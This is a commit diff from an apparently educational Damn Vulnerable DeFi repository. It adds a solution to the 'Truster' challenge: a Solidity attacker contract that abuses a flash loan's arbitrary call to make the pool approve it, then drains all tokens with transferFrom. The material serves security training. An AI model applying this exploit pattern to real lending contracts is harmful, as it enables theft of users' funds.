839b17ba9e14018d9c31feb90e366d052469d89b
Joshua MARTINELLE <contact@jomar.fr>
2025-04-13 20:42:37 +0200

    Add Truster

--- README.md
+++ README.md
@@ -10,6 +10,7 @@ Damn Vulnerable DeFi is an educational project designed to learn about DeFi secu
 |----------------|----------------------|-----------|-----------------|
 | Unstoppable | Stop the lending pool from offering flash loans | [Unstoppable.t.sol](test/unstoppable/Unstoppable.t.sol) | [Unstoppable Writeup](https://blog.jomar.fr/posts/2025/damn_vulnerable_defi/unstopable/) |
 | Naive Receiver | Rescue all WETH from the user and the pool | [NaiveReceiver.t.sol](test/naive-receiver/NaiveReceiver.t.sol) | [Naive Receiver Writeup](https://blog.jomar.fr/posts/2025/damn_vulnerable_defi/naive_receiver/) |
+| Truster | Rescue all funds in the pool executing a single transaction | [Truster.t.sol](test/truster/Truster.t.sol) | [Truster Writeup](https://blog.jomar.fr/posts/2025/damn_vulnerable_defi/truster/) |
 
 ## Acknowledgments
 
--- test/truster/Truster.t.sol
+++ test/truster/Truster.t.sol
@@ -10,7 +10,7 @@ contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant TOKENS_IN_POOL = 1_000_000e18;
 
     DamnValuableToken public token;
@@ -51,7 +51,18 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        // Deploy the attacker contract before player actions start
+        TrusterAttacker attacker = new TrusterAttacker();
+
+        // The checkSolvedByPlayer modifier activates vm.startPrank(player) here
+
+        // Call the attack function which executes everything in a single transaction
+        attacker.attack(
+            address(pool),
+            address(token),
+            recovery,
+            TOKENS_IN_POOL
+        );
     }
 
     /**
@@ -63,6 +74,37 @@ contract TrusterChallenge is Test {
 
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
+    }
+}
+
+// Attacker contract to execute the exploit in a single transaction
+contract TrusterAttacker {
+    function attack(
+        address poolAddress,
+        address tokenAddress,
+        address recoveryAddress,
+        uint256 amount
+    ) external {
+        // Cast to appropriate contract types
+        TrusterLenderPool pool = TrusterLenderPool(poolAddress);
+        DamnValuableToken token = DamnValuableToken(tokenAddress);
+
+        // Prepare data for the approve function call
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(this), // Approve our contract
+            amount
+        );
+
+        // Execute the flash loan with malicious data
+        pool.flashLoan(0, address(this), tokenAddress, data);
+
+        // Transfer all tokens to the recovery address
+        token.transferFrom(poolAddress, recoveryAddress, amount);
     }
 }
